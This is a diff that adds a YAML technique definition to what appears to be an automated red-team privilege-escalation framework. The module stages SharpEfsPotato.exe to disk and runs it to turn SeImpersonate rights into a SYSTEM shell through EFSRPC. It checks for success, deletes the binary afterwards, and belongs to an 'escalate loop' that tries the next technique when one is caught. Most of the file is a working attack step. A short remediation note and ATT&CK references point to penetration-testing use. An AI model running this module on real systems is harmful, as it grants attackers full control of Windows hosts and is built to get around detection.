@@ -1,0 +1,44 @@
+# SeImpersonate → SYSTEM via SharpEfsPotato (native .exe rung)
+#
+# Part of the SeImpersonate → SYSTEM delivery ladder (family: seimpersonate).
+# The escalate loop fires ladder rungs in evasion-posture order and climbs to
+# the next family member when one is caught. This rung: SharpEfsPotato.exe staged to
+# disk, invoked by cmd.
+#
+# SharpEfsPotato (.NET) abuses EFSRPC (MS-EFSR) — works where the spooler is disabled.
+technique: T1134.002
+name: SeImpersonate → SYSTEM (SharpEfsPotato)
+tactic: [privilege-escalation]
+platform: [windows]
+key: seimpersonate:efspotato
+family: seimpersonate
+delivery: native-exe
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  privilege: [SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege]
+execute:
+  command: |-
+    {{stage}}\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
+  stages:
+    - name: SharpEfsPotato
+      as: '{{stage}}\SharpEfsPotato.exe'
+cleanup:
+  command: |-
+    del {{stage}}\SharpEfsPotato.exe
+verify:
+  success: "NT AUTHORITY"
+report:
+  vector_type: seimpersonate
+  description: >
+    SharpEfsPotato (.NET) abuses EFSRPC (MS-EFSR) — works where the spooler is disabled.
+    Staged as a native .exe under the operator's Windows staging dir; the
+    escalate loop pushes it from the arsenal.
+  remediation: >
+    Don't grant SeImpersonate to non-tier-0 accounts. Service accounts that
+    need it (IIS worker, MSSQL service) should be isolated and monitored;
+    Credential Guard + protected process light for tier-0 processes helps
+    contain the blast radius.
+  refs: [T1134.002, SharpEfsPotato]
